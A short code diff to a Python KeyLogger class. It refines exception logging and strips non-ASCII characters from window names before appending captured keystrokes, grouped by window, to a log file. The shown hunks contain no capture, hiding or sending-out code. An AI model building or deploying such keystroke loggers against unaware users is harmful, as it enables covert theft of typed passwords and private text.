@@ -89,7 +89,8 @@ class KeyLogger:
             self.keylog_data = []
             self.key_strokes = ""
         except Exception as e:
-            self.logger.error(f'{e}') 
+            self.logger.error(f'Type of Exception: {type(e)}')
+            self.logger.error(f'Error Message: {e}')
             self.logger.info("Clearing log data...")
             self.keylog_data = []
 
@@ -104,7 +105,8 @@ class KeyLogger:
         with open(self.log_file,'a+') as f:
             f.write(time.strftime("%c\n"))
             for keys in log_info:
-                f.write(f'Window Name: [{keys}]\n\t{log_info[keys]}\n')
+                window_name = keys.encode('ascii','ignore').decode()
+                f.write(f'Window Name: [{window_name}]\n\t{log_info[keys]}\n')
             f.write('*'*30+'\n\n')
         self.logger.info('Keylog saved successfully.')
 
